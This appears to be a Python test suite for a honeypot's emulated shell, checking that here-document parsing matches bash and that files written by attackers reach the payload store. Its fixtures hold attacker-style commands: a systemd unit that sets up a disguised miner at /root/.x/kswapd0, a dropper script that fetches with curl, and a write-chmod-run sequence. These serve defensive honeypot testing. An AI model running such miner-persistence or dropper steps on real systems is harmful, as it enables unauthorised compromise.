r"""Here-documents: quoted ones were real, and real ones lost their block.

Sixty-third coherence sweep. Writing a file with a here-document is how
most installers stage anything they cannot download -- a systemd unit, a
config, a second-stage script -- so: does `cat > f <<EOF` behave?

The simple form did. Three things around it did not, and the first was
found by accident: a probe script of mine containing the characters `<<`
inside a quoted echo string had the rest of itself swallowed.

  1. The heredoc scan searched the whole line with no idea of quoting, so
     `echo "usage: cmd <<EOF"` was read as a redirection. The operator and
     everything after it vanished from the command, and the following
     lines were eaten as a body looking for a terminator that never came,
     so the remainder of the script simply did not run. >>, | and & were
     already quote-safe; only << was not.

  2. A heredoc inside a compound command destroyed the compound. The old
     extractor returned a flat list of (command, body) pairs and run()
     executed those pairs one at a time, which threw away every enclosing
     construct: an if, a for, a while or a function ran the heredoc body
     eagerly and then reported its own keyword as "command not found".
     `if [ ! -f /etc/systemd/system/x.service ]; then cat > ... <<EOF` is
     the ordinary shape of an installer's guarded write, and it wrote the
     file whatever the condition said, then errored on `if`.

  3. Only the first heredoc on a line was taken. `cat <<A > x; cat <<B >
     y` left `<<B` in the second command, where cat took it for a
     filename.

The extractor now removes only the body lines, leaves the operator as an
opaque marker, and hands the body to the command carrying that marker at
the moment it runs -- which is also when bash expands an unquoted-
delimiter body.

Every expectation below was diffed against real bash on the dev host.

Run from `honeypot/`, or on the guest.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fakeshell as fs                                          # noqa: E402

PASS, FAIL = [], []


def shell():
    s = fs.Shell(fs.VFS(), user="root", peer="203.0.113.77")
    s.exec_mode = True
    return s


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond:
        print("  FAIL %-48s %s" % (name, detail))


def eq(name, got, want):
    check(name, got == want, "want %r got %r" % (want, got))


def out(script):
    s = shell()
    o = s.run(script)
    o += "".join(s._err)
    s._err.clear()
    return o


# -- << is only an operator when it is not quoted ------------------------

def t_quoted_shift_is_text():
    eq('double quotes', out('echo "a << b"'), "a << b\n")
    eq('single quotes', out("echo 'a << b'"), "a << b\n")
    eq('with a dash', out('echo "x <<- y"'), "x <<- y\n")
    eq('no spaces', out('echo "a<<b"'), "a<<b\n")
    eq('looks like a heredoc', out('echo "heredoc: <<EOF"'),
       "heredoc: <<EOF\n")


def t_a_quoted_shift_does_not_eat_the_script():
    """The failure that started this: everything after was swallowed."""
    got = out('echo "first << marker"\necho second\necho third')
    eq("all three lines ran", got, "first << marker\nsecond\nthird\n")


def t_it_survives_a_variable():
    eq("through a variable", out('V="a << b"; echo "$V"'), "a << b\n")


def t_the_other_operators_were_already_safe():
    for op in (">>", "|", "&", ">", "<"):
        eq("quoted %s" % op, out('echo "a %s b"' % op), "a %s b\n" % op)


# -- the ordinary forms still work ---------------------------------------

def t_write_a_file():
    eq("body reaches the file",
       out("cd /tmp && cat > a.txt <<EOF\nhello\nEOF\ncat a.txt"), "hello\n")


def t_unquoted_delimiter_expands():
    eq("expands", out("V=world; cat <<EOF\nhi $V\nEOF"), "hi world\n")


def t_quoted_delimiter_does_not():
    eq("literal", out("V=world; cat <<'EOF'\nhi $V $(echo x)\nEOF"),
       "hi $V $(echo x)\n")


def t_expansion_happens_when_the_command_runs():
    """bash expands the body at run time, so an assignment on the same
    line is already in effect."""
    eq("assignment first", out("V=set; cat <<EOF\n$V\nEOF"), "set\n")


def t_dash_strips_leading_tabs():
    eq("tabs gone", out("cat <<-EOF\n\tind\n\tented\n\tEOF"), "ind\nented\n")


def t_into_a_pipe():
    eq("counts the body", out("cat <<EOF | wc -l\na\nb\nEOF"), "2\n")


def t_append():
    eq("appends", out("cd /tmp && printf 'one\\n' > b.txt && "
                      "cat >> b.txt <<'EOF'\ntwo\nEOF\ncat b.txt"),
       "one\ntwo\n")


def t_herestring():
    eq("plain", out('cat <<< "herestring"'), "herestring\n")
    eq("expanded", out('V=hi; cat <<< "$V there"'), "hi there\n")


def t_empty_body():
    eq("empty", out("cat <<EOF\nEOF\necho done"), "done\n")


# -- inside a compound command -------------------------------------------

def t_inside_if():
    eq("if", out("if true; then\ncat <<EOF\ninside\nEOF\nfi"), "inside\n")


def t_inside_for():
    eq("for", out("for x in 1 2; do\ncat <<EOF\nitem\nEOF\ndone"),
       "item\nitem\n")


def t_inside_while():
    eq("while", out("i=0\nwhile [ $i -lt 2 ]; do\ncat <<EOF\nloop\nEOF\n"
                    "i=$((i+1))\ndone"), "loop\nloop\n")


def t_inside_a_function():
    eq("brace on its own line",
       out("f() {\ncat <<EOF\ninside\nEOF\n}\nf"), "inside\n")
    eq("brace on the same line",
       out("f(){ cat <<EOF\ninside\nEOF\n}\nf"), "inside\n")


def t_nested_compounds():
    eq("function around if",
       out("f(){\nif true; then\ncat <<EOF\ndeep\nEOF\nfi\n}\nf"), "deep\n")


def t_no_stray_keyword_errors():
    """The compound's own keyword must not come back as a command."""
    for script in ("if true; then\ncat <<EOF\nx\nEOF\nfi",
                   "for i in 1; do\ncat <<EOF\nx\nEOF\ndone",
                   "f(){\ncat <<EOF\nx\nEOF\n}\nf"):
        got = out(script)
        check("no command-not-found: %s" % script.split("\n")[0],
              "command not found" not in got, got[:70])


def t_the_guarded_write_an_installer_does():
    """The condition has to be honoured, not bypassed."""
    eq("guard true writes",
       out("if [ ! -f /tmp/unit.service ]; then\n"
           "cat > /tmp/unit.service <<EOF\n[Unit]\nEOF\nfi\n"
           "cat /tmp/unit.service"), "[Unit]\n")
    eq("guard false does not write",
       out("if [ -f /etc/passwd ]; then echo skip; else\n"
           "cat > /tmp/never.txt <<EOF\nbad\nEOF\nfi\n"
           "test -f /tmp/never.txt && echo WROTE || echo notwritten"),
       "skip\nnotwritten\n")


def t_a_realistic_unit_file_install():
    got = out("cd /tmp && if true; then\n"
              "cat > /etc/systemd/system/miner.service <<'EOF'\n"
              "[Unit]\nDescription=miner\n[Service]\n"
              "ExecStart=/root/.x/kswapd0\n[Install]\n"
              "WantedBy=multi-user.target\nEOF\nfi\n"
              "grep -c . /etc/systemd/system/miner.service")
    eq("six lines written", got, "6\n")


# -- more than one on a line ---------------------------------------------

def t_two_heredocs_on_one_line():
    eq("both bodies land",
       out("cd /tmp && cat <<A > x.txt; cat <<B > y.txt\naaa\nA\nbbb\nB\n"
           "cat x.txt y.txt"), "aaa\nbbb\n")


def t_three_heredocs_on_one_line():
    eq("in order",
       out("cd /tmp && cat <<A >1.t; cat <<B >2.t; cat <<C >3.t\n"
           "a\nA\nb\nB\nc\nC\ncat 1.t 2.t 3.t"), "a\nb\nc\n")


def t_no_operator_is_left_behind():
    got = out("cd /tmp && cat <<A > x.txt; cat <<B > y.txt\na\nA\nb\nB")
    check("no filename complaint", "No such file" not in got, got[:70])


# -- the dropper shape ---------------------------------------------------

def t_write_chmod_run():
    eq("payload runs",
       out("cd /tmp && cat > run.sh <<'EOF'\n#!/bin/bash\necho payload-ran\n"
           "EOF\nchmod +x run.sh && ./run.sh"), "payload-ran\n")


def t_the_body_is_captured_as_a_payload():
    """A file written this way still has to reach the payload store."""
    ev = []
    s = fs.Shell(fs.VFS(), log=lambda **k: ev.append(k), user="root",
                 peer="203.0.113.77")
    s.exec_mode = True
    s.run("cd /tmp && cat > drop.sh <<'EOF'\n#!/bin/sh\ncurl -s http://x/y\n"
          "EOF\nchmod +x drop.sh")
    s._err.clear()
    writes = [e for e in ev if e.get("event") == "payload_written"]
    check("payload_written raised", writes, str([e.get("event") for e in ev]))
    if writes:
        check("it is the script", "drop.sh" in str(writes[0].get("path")),
              str(writes[0]))


TESTS = [t_quoted_shift_is_text, t_a_quoted_shift_does_not_eat_the_script,
         t_it_survives_a_variable, t_the_other_operators_were_already_safe,
         t_write_a_file, t_unquoted_delimiter_expands,
         t_quoted_delimiter_does_not,
         t_expansion_happens_when_the_command_runs,
         t_dash_strips_leading_tabs, t_into_a_pipe, t_append, t_herestring,
         t_empty_body, t_inside_if, t_inside_for, t_inside_while,
         t_inside_a_function, t_nested_compounds, t_no_stray_keyword_errors,
         t_the_guarded_write_an_installer_does,
         t_a_realistic_unit_file_install, t_two_heredocs_on_one_line,
         t_three_heredocs_on_one_line, t_no_operator_is_left_behind,
         t_write_chmod_run, t_the_body_is_captured_as_a_payload]


def main():
    for t in TESTS:
        try:
            t()
        except Exception as exc:                              # noqa: BLE001
            check(t.__name__, False, "crashed: %r" % (exc,))
    print("passed %d, failed %d" % (len(PASS), len(FAIL)))
    if FAIL:
        print("failed: " + ", ".join(FAIL[:8]))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
